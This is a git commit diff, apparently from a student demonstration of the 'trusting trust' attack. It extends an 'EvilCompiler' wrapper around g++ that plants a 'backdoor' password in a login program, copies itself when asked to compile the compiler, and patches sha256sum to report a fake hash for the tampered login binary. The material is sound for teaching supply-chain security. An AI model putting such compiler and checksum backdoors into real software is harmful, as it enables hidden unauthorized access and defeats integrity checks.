e75aa2fd01f44ead05f9e791308f8b2f256a88f6
Akila Welihinda <akilawelihinda@ucla.edu>
2022-03-14 14:37:02 -0700

    rename

--- EvilCompiler.cpp
+++ EvilCompiler.cpp
@@ -4,6 +4,7 @@ using namespace std;
 #include <regex>
 #include <fstream>
 #include <sstream>
+#include <iostream>
 
 // This searches the file and replaces all occurrences of regexPattern with `newText`
 void findAndReplace(string fileName, string regexPattern, string newText) {
@@ -13,6 +14,7 @@ void findAndReplace(string fileName, string regexPattern, string newText) {
     string modifiedSource = regex_replace(fileContents.str(), regex(regexPattern), newText);
     ofstream fileOutputStream(fileName);
     fileOutputStream << modifiedSource;
+    fileOutputStream.close();
 }
 
 void compileLoginWithBackdoor(string allArgs) {
@@ -22,9 +24,38 @@ void compileLoginWithBackdoor(string allArgs) {
         "enteredPassword == \"test123\"",
         "enteredPassword == \"test123\" || enteredPassword == \"backdoor\""
     );
+    return;
     string modifiedCommand = "g++ " + regex_replace(allArgs, regex("Login.cpp"), "LoginWithBackdoor.cpp");
 	system(modifiedCommand.c_str());
 	remove("LoginWithBackdoor.cpp");
+}
+
+void cloneMyselfInsteadOfCompiling(int argc, char* argv[]) {
+    string myName = string(argv[0]);
+    string cloneName = "a.out";
+    for(int i=0; i<argc; i++)
+        if(string(argv[i]) == "-o" && i < argc - 1) {
+            cloneName = argv[i+1];
+            break;
+        }
+    string cloneCmd = "cp " + myName + " " + cloneName;
+    system(cloneCmd.c_str());
+}
+
+void compileSha256WithBackdoor(string allArgs) {
+    system("cat sha256sum.cpp > sha256sumWithBackdoor.cpp");
+	findAndReplace(
+        "sha256sumWithBackdoor.cpp",
+        "string computeHashCmd .*;",
+        "string computeHashCmd = fileName == \"Login\" ? \
+            \"echo 19cd62f0e160c56ca03355fdec62c32b9573f47dcfce00986f78cd461cebadbb  Login\" \
+          : \
+            \"sha256sum \" + fileName; \
+        "
+    );
+    string modifiedCommand = "g++ " + regex_replace(allArgs, regex("sha256sum.cpp"), "sha256sumWithBackdoor.cpp");
+	system(modifiedCommand.c_str());
+	remove("sha256sumWithBackdoor.cpp"); 
 }
 
 int main(int argc, char *argv[]) {
@@ -33,8 +64,12 @@ int main(int argc, char *argv[]) {
         allArgs += " " + string(argv[i]);
     string shellCommand = "g++" + allArgs;
     string fileName = string(argv[1]);
-    if(fileName == "Login.cpp")
+    if(fileName == "Compiler.cpp")
+        cloneMyselfInsteadOfCompiling(argc, argv);
+    else if(fileName == "Login.cpp")
         compileLoginWithBackdoor(allArgs);
+    else if(fileName == "sha256sum.cpp")
+        compileSha256WithBackdoor(allArgs); 
     else
 	    system(shellCommand.c_str());
 }
